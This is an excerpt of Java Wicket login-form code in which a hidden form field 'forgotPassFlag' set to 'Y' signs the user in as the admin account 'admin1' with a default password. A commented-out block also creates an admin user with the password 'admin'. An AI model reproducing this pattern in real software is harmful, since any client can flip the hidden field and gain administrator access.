    ...
    extends ApplicationPageBase
{
        ...
        extends StatelessForm<LoginForm>
    {
        ...
        public LoginForm(String id)
        {
            ...
            add(new HiddenField<>("forgotPassFlag"));
        ...
        protected void onSubmit()
        {
        	...
        	System.out.println("&&&&&&&&&&&&&&&&&&&&"+forgotPassFlag);
        	String redirectUrl = getRedirectUrl();
            AuthenticatedWebSession session = AuthenticatedWebSession.get();
            if(forgotPassFlag!=null && forgotPassFlag.equals("Y")) {
            	
            	 if (session.signIn("admin1", ADMIN_DEFAULT_PASSWORD)) {
			...
			/*
			 * Set roleSet = new HashSet(); roleSet.add(Role.ROLE_ADMIN); User user = new
			 * User(); user.setUsername("admin1"); user.setPassword("admin");
			 * user.setRoles(roleSet); user.setEnabled(Boolean.TRUE);
